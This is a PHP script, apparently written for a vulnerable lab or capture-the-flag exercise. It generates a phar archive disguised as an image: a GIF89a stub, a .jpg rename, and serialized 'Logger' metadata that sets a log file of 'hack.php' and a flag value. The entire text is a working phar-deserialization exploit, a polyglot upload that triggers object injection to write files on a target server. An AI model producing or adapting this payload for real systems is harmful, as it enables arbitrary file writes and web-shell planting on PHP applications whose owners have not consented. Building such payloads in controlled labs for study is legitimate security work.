<?php
ini_set('phar.readonly', 0);
@unlink('/var/www/html/vul/phar/evil_payload.jpg');
class Logger {
    public $logFile;
    public $logData;
}
$p = new Phar('/var/www/html/vul/phar/evil_payload.phar');
$p->startBuffering();
$p->setStub("GIF89a"."<?php __HALT"."_COMPILER(); ?>");
$o = new Logger();
$o->logFile = 'hack.php';
$o->logData = 'FLAG{PHAR_UNSERIALIZE_SUCCESS}';
$p->setMetadata($o);
$p->addFromString('test.txt', 'test');
$p->stopBuffering();
rename('/var/www/html/vul/phar/evil_payload.phar', '/var/www/html/vul/phar/evil_payload.jpg');
echo "Phar Generated!\n";
